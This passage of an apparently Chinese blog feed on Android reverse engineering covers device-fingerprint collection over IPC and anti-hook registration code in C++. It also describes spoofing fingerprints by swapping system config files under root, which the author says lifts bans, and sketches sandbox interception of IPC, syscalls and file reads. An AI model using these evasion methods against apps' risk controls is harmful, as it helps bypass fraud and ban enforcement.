版本中<strong>可能</strong>会改变（虽然实践中很少改变）。如果直接在代码里硬编码一个整数值（例如 <code>int a = 14;</code>），那么当应用运行在一个该值已改变的 Android 系统上时，调用就会失败。 因此，通过反射去动态获取当前运行环境下的确切值，是一种<strong>兼容性更好、更稳健</strong>的做法。</p><h4 id="Maps解析Apk签名"><a href="#Maps解析Apk签名" class="headerlink" title="Maps解析Apk签名"></a>Maps解析Apk签名</h4><p>这块还有一个方案，主要实现思路就是因为我们当前进程去打开apk是存在风险的 。</p><p>很有可能被IO重定向，导致得到的签名是错误的，所以我们可以<strong>让三方进程去加载当前apk文件，通过共享内存的方式，然后当前进程对apk文件maps里面的内存签名进行解析即可</strong> 。这块需要双进程通讯 。</p><h4 id="其他字段IPC"><a href="#其他字段IPC" class="headerlink" title="其他字段IPC"></a>其他字段IPC</h4><p>根据上面的两个经典IPC例子，可以发现只要是服务端获取的都可以使用<strong>IPC协议</strong>的方式去获取 。</p><p>其他字段其实一样也可以这么玩 ，如果需要什么字段，就对照安卓源码客户端往里面写入对应的数据，直接IPC即可</p><blockquote><p>分析SO文件的时候直接对jni交互进行监听，在保存的调用栈里面看</p><p>他如果调用了<code>Parcel.obtain()</code> 初始化或者 这种<code>writeLong ()</code>写入数据的方法，基本就可以确认他是IPC获取的一些字段，具体看他写入的内容是什么，或者看他写入的token是什么，比如上面的获取签名的token就是<code>&quot;android.content.pm.IPackageManager&quot;</code> ，即可知道他想做什么字段的获取</p></blockquote><h4 id="IPC总结-反思"><a href="#IPC总结-反思" class="headerlink" title="IPC总结&amp;反思"></a>IPC总结&amp;反思</h4><p>后来又思考了一下，IPC服务端这些设备指纹，或者说这些配置到底哪里来的，一直在源码里面跟。</p><p>发现就拿android id来说，他最终读取的文件路径是<code>/data/system/users/0/settings_ssaid.xml</code> ，这个目录下，<code>/data/system/users/0/</code>我发现这里面全是各种注册表和各种配置信息。我这边尝试改了一下里面的<code>android id</code> 。然后直接手机重启 ，我发现我之前自己写的<code>Hunter</code>获取的设备指纹<code>android id</code>竟然变了</p><p>后来我把这些文件都拷贝出来，把里面熟悉的值都随机了一份，通过magisk 插件系统文件替换的方式，对文件<code>/data/system/users/0/</code>进行替换 ，真没想到以前被封的设备解封了。而且不需要回复出厂设置，只需要<strong>软重启</strong>一下就行</p><p><strong>而且基本可以做到无痕 ，因为没有对apk任何修改，改的全是系统级别的变量，而我只需要Root ，替换系统文件，相当于每一次都是恢复出厂设置</strong></p><p>现在基本大厂想要在回复出厂设置保持设备指纹不变基本不可能 。这套方案我测试过一段时间，现阶段基本大厂从客户端角度基本没办法对抗，只能靠一些服务端指纹去做检测。</p><h4 id="服务端级别设备指纹"><a href="#服务端级别设备指纹" class="headerlink" title="服务端级别设备指纹"></a>服务端级别设备指纹</h4><p>服务端去获取客户端的IPV6信息，配合客户端上报。IPV6号称能给世界上每粒沙子分配一个ip，2的128次方</p><p>可以在设备指纹初始化的时候调用一下接口，服务端网关层去获取IpV6信息 。将信息保存作为客户端设备指纹</p><p><strong>tls最新版+socket进行通讯</strong> ，用这个ipv6作为设备指纹 。当然这块也需要防代理，具体的方案也很多，比如一些大厂会去购买一些代理IP，试用的时候去请求自己的网关，然后把这些IP都拉黑</p><h3 id="Hunter检测-反制"><a href="#Hunter检测-反制" class="headerlink" title="Hunter检测&amp;反制"></a>Hunter检测&amp;反制</h3><p>这块主要是介绍一些比较新奇的对抗和检测 ，也是我之前在做黑产对抗的时候发现的一些办法</p><h4 id="MapIo重定向Anti"><a href="#MapIo重定向Anti" class="headerlink" title="MapIo重定向Anti"></a>MapIo重定向Anti</h4><p>一般在实现一机多号的时候，因为需要对不同的账号进行<strong>IO重定向</strong>，把不同的账号，保存到自己的虚拟分身里面</p><p>这时候如果你要读取<code>Maps</code>去遍历<code>Item</code>的时候就会发现这个<code>Item</code>异常，一般沙箱开发者会将<code>MapsIo</code>重定向</p><p>当发现读取<code>Maps</code>的时候指向自己的文件，因为这个Maps是不断变化的，所以需要在<code>svc openat</code>这块进行拦截生成一份新的。然后指向到这份新的文件，在新的<code>maps</code>里面他会对里面的<code>item</code>路径进行反转，转换成正常的目录，而不是包含沙箱的目录，导致获取的数据被欺骗</p><p>这块读文件偏移完全可以不读取<code>Maps</code> ，而是读取<code>proc/self/maps_files</code>对这个文件进行<code>opendir</code> ，对每个文件进行遍历，然后再路径拼接，通过<code>readlinkat</code>去反查路径即可</p><h4 id="“反调试”进程检测实现细节"><a href="#“反调试”进程检测实现细节" class="headerlink" title="“反调试”进程检测实现细节"></a>“反调试”进程检测实现细节</h4><p>一般<code>Apk</code>都会开启一条线程作为检测反调试线程，这条线每隔几秒对线程进行一些特征进行检查当前进程是否被调试</p><p>有很多攻击者会<code>Hook</code>线程创建的办法，然后在线程启动的时候进行<code>pass</code>，不让其启动，以实现逃过检测的办法</p><p>这种情况其实对抗也很简单，可以在主线程搞个<code>flag</code>，只有在调试线程开启的时候，并且检测执行成功的时候使用<code>process_vm_writev</code>对<code>flag</code>进行写入</p><p>因为是异步，所以主线程可以延迟2秒钟对这个<code>flag</code>进行检测，判断调试线程是否开启，如果没开启上报埋点即可</p><h4 id="自实现RegisterNativeMethod"><a href="#自实现RegisterNativeMethod" class="headerlink" title="自实现RegisterNativeMethod"></a>自实现RegisterNativeMethod</h4><p>我们正常注册一个native方法是调用的<code>env-&gt;RegisterNatives</code> ，但是这种直接api调用很有可能被Hook</p><p>所以我们可以自己实现一份 ，因为native注册底层本质上是给<code>artmethod</code>里面的<code>fnptr</code>进行赋值，最终调用<code>artmethod</code>里面的<code>RegisterNative</code>方法，所以我们可以不直接调用<code>Jni</code>直接走<code>artmethod</code>里面的注册方法</p><p>具体实现如下，因为<code>artmethod</code>里面的注册方法每个版本的实现都不一样 ，所以这块需要根据不同版本进行<code>case</code>分发 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//call art method register</span><br><span class="line">if (!RegisterNativeMethod(env, NativeEngine,</span><br><span class="line">                          SignatureFixMethods,</span><br><span class="line">                          sizeof(SignatureFixMethods) / sizeof(SignatureFixMethods[0]))) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;JNI_OnLoad call art method register fail ,start env register natives! &quot;;</span><br><span class="line"> </span><br><span class="line">    env-&gt;RegisterNatives(NativeEngine,</span><br><span class="line">                         SignatureFixMethods,</span><br><span class="line">                         sizeof(SignatureFixMethods) / sizeof(SignatureFixMethods[0]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用的话很简单直接尝试调用我们自己实现的方法，如果失败了则调用系统的api ，这样可以有效防止<code>jni</code>被<code>hook</code>实现，<code>jni RegisterNative</code> 函数被监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Created by Zhenxi on 2022/8/22.</span><br><span class="line">//</span><br><span class="line"> </span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"> </span><br><span class="line">#include &quot;../include/logging.h&quot;</span><br><span class="line">#include &quot;../include/libpath.h&quot;</span><br><span class="line">#include &quot;../include/dlfcn_compat.h&quot;</span><br><span class="line">#include &quot;../include/version.h&quot;</span><br><span class="line">#include &quot;../include/main.h&quot;</span><br><span class="line"> </span><br><span class="line">static void *art_method_register = nullptr;</span><br><span class="line"> </span><br><span class="line">static void *class_linker_ = nullptr;</span><br><span class="line"> </span><br><span class="line">size_t OffsetOfJavaVm(bool has_small_irt, int SDK_INT) &#123;</span><br><span class="line"> </span><br><span class="line">    if (has_small_irt) &#123;</span><br><span class="line">        switch (SDK_INT) &#123;</span><br><span class="line">            case ANDROID_T:</span><br><span class="line">            case ANDROID_SL:</span><br><span class="line">            case ANDROID_S:</span><br><span class="line">                return sizeof(void *) == 8 ? 624 : 300;</span><br><span class="line">            case ANDROID_R:</span><br><span class="line">            case ANDROID_Q:</span><br><span class="line">                return sizeof(void *) == 8 ? 528 : 304;</span><br><span class="line">            default:</span><br><span class="line">                LOGE(&quot;OffsetOfJavaVM Unexpected android version %d&quot;, SDK_INT);</span><br><span class="line">                abort();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        switch (SDK_INT) &#123;</span><br><span class="line">            case ANDROID_T:</span><br><span class="line">            case ANDROID_SL:</span><br><span class="line">            case ANDROID_S:</span><br><span class="line">                return sizeof(void *) == 8 ? 520 : 300;</span><br><span class="line">            case ANDROID_R:</span><br><span class="line">            case ANDROID_Q:</span><br><span class="line">                return sizeof(void *) == 8 ? 496 : 288;</span><br><span class="line">            default:</span><br><span class="line">                LOGE(&quot;OffsetOfJavaVM Unexpected android version %d&quot;, SDK_INT);</span><br><span class="line">                abort();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">int findOffset(void *start, size_t len, size_t step, T value) &#123;</span><br><span class="line"> </span><br><span class="line">    if (nullptr == start) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    for (int i = 0; i &lt;= len; i += step) &#123;</span><br><span class="line">        T current_value = *reinterpret_cast&lt;T *&gt;((size_t) start + i);</span><br><span class="line">        if (value == current_value) &#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line">* 根据runtime获取class_linker</span><br><span class="line">* https://github.com/magician8520/BlackBox/blob/99f26925aa303fd0a71543e3713ef3fc57a08e81/Bcore/pine-core/src/main/cpp/android.h#L36</span><br><span class="line">*/</span><br><span class="line">void *getClassLinker() &#123;</span><br><span class="line">    if (class_linker_ != nullptr) &#123;</span><br><span class="line">        return class_linker_;</span><br><span class="line">    &#125;</span><br><span class="line">    int SDK_INT = get_sdk_level();</span><br><span class="line">    // If SmallIrtAllocator symbols can be found, then the ROM has merged commit &quot;Initially allocate smaller local IRT&quot;</span><br><span class="line">    // This commit added a pointer member between `class_linker_` and `java_vm_`. Need to calibrate offset here.</span><br><span class="line">    // https://android.googlesource.com/platform/art/+/4dcac3629ea5925e47b522073f3c49420e998911</span><br><span class="line">    // https://github.com/crdroidandroid/android_art/commit/aa7999027fa830d0419c9518ab56ceb7fcf6f7f1</span><br><span class="line">    bool has_smaller_irt = getSymCompat(getlibArtPath(),</span><br><span class="line">                                        &quot;_ZN3art17SmallIrtAllocator10DeallocateEPNS_8IrtEntryE&quot;) !=</span><br><span class="line">                           nullptr;</span><br><span class="line">    size_t jvm_offset = OffsetOfJavaVm(has_smaller_irt, SDK_INT);</span><br><span class="line">    auto runtime_instance_ = *reinterpret_cast&lt;void **&gt;</span><br><span class="line">    (getSymCompat(getlibArtPath(), &quot;_ZN3art7Runtime9instance_E&quot;));</span><br><span class="line"> </span><br><span class="line">    auto val = jvm_offset</span><br><span class="line">               ? reinterpret_cast&lt;std::unique_ptr&lt;JavaVM&gt; *&gt;(</span><br><span class="line">                       reinterpret_cast&lt;uintptr_t&gt;(runtime_instance_) + jvm_offset)-&gt;get()</span><br><span class="line">               : nullptr;</span><br><span class="line">    if (val == getVm()) &#123;</span><br><span class="line">        LOGD(&quot;JavaVM offset matches the default offset&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        LOGW(&quot;JavaVM offset mismatches the default offset, try search the memory of Runtime&quot;);</span><br><span class="line">        int offset = findOffset(runtime_instance_, 1024, 4, getVm());</span><br><span class="line">        if (offset == -1) &#123;</span><br><span class="line">            LOGE(&quot;Failed to find java vm from Runtime&quot;);</span><br><span class="line">            return nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">        jvm_offset = offset;</span><br><span class="line">        LOGW(&quot;Found JavaVM in Runtime at %zu&quot;, jvm_offset);</span><br><span class="line">    &#125;</span><br><span class="line">    const size_t kDifference = has_smaller_irt</span><br><span class="line">                               ? sizeof(std::unique_ptr&lt;void&gt;) + sizeof(void *) * 3</span><br><span class="line">                               : SDK_INT == ANDROID_Q</span><br><span class="line">                                 ? sizeof(void *) * 2</span><br><span class="line">                                 : sizeof(std::unique_ptr&lt;void&gt;) + sizeof(void *) * 2;</span><br><span class="line"> </span><br><span class="line">    class_linker_ = *reinterpret_cast&lt;void **&gt;(reinterpret_cast&lt;uintptr_t&gt;(runtime_instance_) +</span><br><span class="line">                                               jvm_offset - kDifference);</span><br><span class="line">    return class_linker_;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">bool call_MethodRegister(JNIEnv *env, void *art_method, void *native_method) &#123;</span><br><span class="line">    if (art_method_register == nullptr) &#123;</span><br><span class="line">        if (get_sdk_level() &lt; ANDROID_S) &#123;</span><br><span class="line">            //android 11</span><br><span class="line">            art_method_register = getSymCompat(getlibArtPath(),</span><br><span class="line">                                               &quot;_ZN3art9ArtMethod14RegisterNativeEPKv&quot;);</span><br><span class="line">            if (art_method_register == nullptr) &#123;</span><br><span class="line">                art_method_register = getSymCompat(getlibArtPath(),</span><br><span class="line">                                                   &quot;_ZN3art9ArtMethod14RegisterNativeEPKvb&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //12以上还是在libart里面,但是在linker里面实现,符号名称存在变化</span><br><span class="line">            art_method_register = getSymCompat(getlibArtPath(),</span><br><span class="line">                                               &quot;_ZN3art11ClassLinker14RegisterNativeEPNS_6ThreadEPNS_9ArtMethodEPKv&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (art_method_register == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method  get art_method_register = null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (get_sdk_level() &gt;= ANDROID_S) &#123;</span><br><span class="line">        //12以上</span><br><span class="line">        //const void* RegisterNative(Thread* self, ArtMethod* method, const void* native_method)</span><br><span class="line">        auto call = reinterpret_cast&lt;void *(*)(void *, void *, void *,</span><br><span class="line">                                               void *)&gt;(art_method_register);</span><br><span class="line">        //get self thread</span><br><span class="line">        void *self = getSymCompat(getlibArtPath(), &quot;_ZN3art6Thread14CurrentFromGdbEv&quot;);</span><br><span class="line">        if (self == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method  get CurrentFromGdb = null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //手动计算一下linker实例地址</span><br><span class="line">        void *classLinker = getClassLinker();</span><br><span class="line">        if (classLinker == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method  get getClassLinker = null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        call(classLinker, self, art_method, native_method);</span><br><span class="line">        //LOG(ERROR) &lt;&lt; &quot;register native method  get getClassLinker success!  &quot;;</span><br><span class="line">    &#125; else if (get_sdk_level() &gt;= ANDROID_R) &#123;</span><br><span class="line">        auto call = reinterpret_cast&lt;void *(*)(void *, void *)&gt;(art_method_register);</span><br><span class="line">        call(art_method, native_method);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        auto call = reinterpret_cast&lt;void *(*)(void *, void *, bool)&gt;(art_method_register);</span><br><span class="line">        call(art_method, native_method, true);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">inline static bool IsIndexId(jmethodID mid) &#123;</span><br><span class="line">    return ((reinterpret_cast&lt;uintptr_t&gt;(mid) % 2) != 0);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static jfieldID field_art_method = nullptr;</span><br><span class="line"> </span><br><span class="line">bool RegisterNativeMethod(JNIEnv *env,</span><br><span class="line">                          jclass clazz,</span><br><span class="line">                          const JNINativeMethod *methods,</span><br><span class="line">                          size_t nMethods) &#123;</span><br><span class="line">    if (env == nullptr) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;register native method  JNIEnv = null  &quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    void *arm_method = nullptr;</span><br><span class="line"> </span><br><span class="line">    for (int i = 0; i &lt; nMethods; i++) &#123;</span><br><span class="line">        jmethodID methodId = env-&gt;GetMethodID(clazz, methods[i].name, methods[i].signature);</span><br><span class="line">        if (methodId == nullptr) &#123;</span><br><span class="line">            //maybe static</span><br><span class="line">            env-&gt;ExceptionClear();</span><br><span class="line">            methodId = env-&gt;GetStaticMethodID(clazz, methods[i].name, methods[i].signature);</span><br><span class="line">            if (methodId == nullptr) &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; &quot;register native method  get orig method  == null  &quot;</span><br><span class="line">                           &lt;&lt; methods[i].signature;</span><br><span class="line">                env-&gt;ExceptionClear();</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (get_sdk_level() &gt;= ANDROID_R) &#123;</span><br><span class="line">            if (field_art_method == nullptr) &#123;</span><br><span class="line">                jclass pClazz = env-&gt;FindClass(&quot;java/lang/reflect/Executable&quot;);</span><br><span class="line">                field_art_method = env-&gt;GetFieldID(pClazz, &quot;artMethod&quot;, &quot;J&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if (field_art_method == nullptr) &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; &quot;register native method  get artMethod  == null  &quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            if (IsIndexId(methodId)) &#123;</span><br><span class="line">                jobject method = env-&gt;ToReflectedMethod(clazz, methodId, true);</span><br><span class="line">                arm_method = reinterpret_cast&lt;void *&gt;(env-&gt;GetLongField(method, field_art_method));</span><br><span class="line">                //LOG(ERROR) &lt;&lt; &quot;arm_method   &quot;&lt;&lt;arm_method ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            arm_method = methodId;</span><br><span class="line">        &#125;</span><br><span class="line">        if (arm_method == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method art method  == null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!call_MethodRegister(env, arm_method, methods[i].fnPtr)) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method fail  &quot; &lt;&lt;</span><br><span class="line">                       methods[i].name &lt;&lt; &quot;  &quot; &lt;&lt; methods[i].signature;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">//        LOG(INFO) &lt;&lt; &quot;register native method success  &quot; &lt;&lt; methods[i].name &lt;&lt; &quot;  &quot;</span><br><span class="line">//                  &lt;&lt; methods[i].signature;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过牺牲稳定性和可移植性来换取高度的隐蔽性</p><h3 id="无Root情况客户端对抗的边界值"><a href="#无Root情况客户端对抗的边界值" class="headerlink" title="无Root情况客户端对抗的边界值"></a>无Root情况客户端对抗的边界值</h3><p>如果在不Root的情况下，注入方法主要两种，重打包或者把Apk放到沙箱里面</p><p>主要的三个核心功能组成水桶木板分别如下</p><ul><li>设备指纹</li><li>环境&amp;风险检测能力</li><li>代码防护</li></ul><p>第一项每个大厂都不一样，<strong>根据不同的策略每个字段的比重占比也都不一样</strong> 。</p><p>把一些常见的或者第一篇和第二篇提到的对着改一下即可</p><p>第三项现在So层基本大厂都差不多，都是各种混淆配合控制流 ，但是Java层防护做的不够，参考<a href="https://bbs.kanxue.com/thread-255514.htm%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BA%9F%E6%8E%89Jadx%E5%8F%8D%E7%BC%96%E8%AF%91%E8%BD%AF%E4%BB%B6">https://bbs.kanxue.com/thread-255514.htm，可以直接废掉Jadx反编译软件</a> </p><p>这块重点介绍一下第二项，包括一些常见的子项 ，每个子项还可以继续划分各种检测方式 。</p><ul><li>环境&amp;风险检测能力<ul><li>重打包检测能力</li><li>Hook检测能力 。</li><li>模拟器&amp;云手机&amp;自定义ROM检测能力</li><li>多开&amp;沙箱检测能力</li><li>风险Apk检测能力</li></ul></li></ul><p>上面说的这几项便是不同”气味“的组成部分，而这个”气味”<strong>采集方式的边界值</strong>又分为三部分 。</p><ul><li><strong>Java层就是IPC协议</strong> ，因为<strong>IPC协议是当前进程可以操作的最后一个方法</strong> 。剩下的就是服务端给喂数据了。</li><li><strong>Native层就是SVC拦截</strong>，因为SVC是Linux进入内核的最后一条指令。</li><li>还有一种是<strong>读文件</strong> ，这块区分成两部分<ul><li><strong>进程文件，也就是&#x2F;proc&#x2F;下面的</strong></li><li><strong>系统文件，系统提供的一些文件可供读取。</strong></li></ul></li></ul><p>好 ，根据上面的总结，<strong>只要我们在上面的三个边界值进行拦截理论上就是最完美的方案 。</strong></p><h3 id="“边界值”拦截技术实现："><a href="#“边界值”拦截技术实现：" class="headerlink" title="“边界值”拦截技术实现："></a>“边界值”拦截技术实现：</h3><p>下面的架子是珍惜大佬的沙箱的设计模式 ，这块也是分享一下对应的“架构” 。</p><h4 id="IPC协议拦截："><a href="#IPC协议拦截：" class="headerlink" title="IPC协议拦截："></a>IPC协议拦截：</h4><p>先说IPC，IPC的话很简单，我在上面也说了可以动态代理，也可以直接去用Hook框架<code>Hook binder</code>里面的交互方法 。当发现触发指定的IPC协议的时候，直接模拟服务端往里面写入即可。</p><p>这块还有个细节点，为了防止程序直接通过<code>cache</code>获取，因为有的字段初始化以后可能被保存到<code>cache</code>里面 ，如果不存在的话再通过ipc去获取。<strong>Apk在启动一瞬间就进行了初始化，cache会被保存</strong>。很多IPC代理人会这么设计，所以<strong>需要清理掉cache</strong>，这个cache可以是Parcel的cache也可以是IPC代理人里面的cache 。<strong>比如Parcel里面的mCreators 或者sPairedCreators 都需要清空</strong> 。如果是IPC代理人的话也可以看代码看具体实现，看看是否包含cache，有的话清掉即可</p><h4 id="SVC拦截："><a href="#SVC拦截：" class="headerlink" title="SVC拦截："></a>SVC拦截：</h4><p>主要用的是ptrace+seccomp做的架子</p><p><a href="https://bbs.kanxue.com/thread-273160.htm">https://bbs.kanxue.com/thread-273160.htm</a></p><h4 id="文件读取："><a href="#文件读取：" class="headerlink" title="文件读取："></a>文件读取：</h4><p>这块分为两部分，<code>proc</code>下的文件我会使用<code>fuse</code> 对整个<code>proc</code>进行模拟 ，这是完美方案 。<code>proot</code>代码写好现成的，迁移到android 上直接用就好了。</p><p>如果是读取系统文件的话，可以直接使用 IO重定向配合SVC拦截即可，SVC都可以拦截了，任何文件读取你都可以随便修改 。 </p><p><strong>因为不管如何，最终都会调用到系统内核去读取文件，都会被转换成SVC指令 。</strong></p><p>第四篇：<a href="https://bbs.kanxue.com/thread-281889-1.htm">https://bbs.kanxue.com/thread-281889-1.htm</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文几乎都是来自于&lt;strong&gt;珍惜any大佬&lt;/strong&gt;的文章，主要是作为小白的学习记录&lt;/p&gt;
&lt;p&gt;原文：&lt;/p&gt;
&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向从入门到入土(1)</title>
    <link href="http://s1nec-1o.github.io/2025/10/11/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/"/>
    <id>http://s1nec-1o.github.io/2025/10/11/Android%E9%80%86%E5%90%91%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-1/</id>
    <published>2025-10-11T06:38:08.000Z</published>
    <updated>2025-10-11T07:45:29.720Z</updated>
    
